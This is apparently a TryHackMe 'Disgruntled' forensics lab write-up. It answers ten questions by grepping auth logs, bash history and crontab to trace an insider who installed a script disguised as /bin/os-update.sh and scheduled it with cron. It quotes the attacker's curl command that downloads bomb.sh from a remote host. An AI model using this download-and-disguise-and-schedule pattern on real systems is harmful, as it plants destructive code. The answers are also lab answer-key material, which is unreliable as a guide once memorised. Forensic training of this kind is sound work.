#linux #forensic 

https://tryhackme.com/r/room/disgruntled

---

**Q1 & Q2**
```shell
cat /var/log/auth.log* | grep -i COMMAND | grep -i apt | tail
```

He used the command **`/usr/bin/apt install dokuwiki`** in **`/home/cybert`**

**Q3**
```shell
cat /var/log/auth.log* | grep -i COMMAND | grep -i adduser | tail
```

The user added were **`it-admin`**

**Q4**
```shell
cat /var/log/auth.log* | grep visudo
```

The date is **`Dec 28 06:27:34`**

**Q5**
```shell
cat /home/it-admin/.bash_history | grep vi
```

The file is **`bomb.sh`**

**Q6**
```shell
cat /home/it-admin/.bash_history | grep bomb.sh
```

The command was **`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`**

**Q7**
```shell
cat /home/it-admin/.viminfo
```

The file is **`/bin/os-update.sh`**

**Q8**
```shell
stat /bin/os-update.sh
```

The date is **`Dec 28 06:29`**

**Q9**
```shell
cat /bin/os-update.sh
```

The file is **`goodbye.txt`***

**Q10**
```shell
cat /etc/crontab
```

The time is **`08:00 AM`**


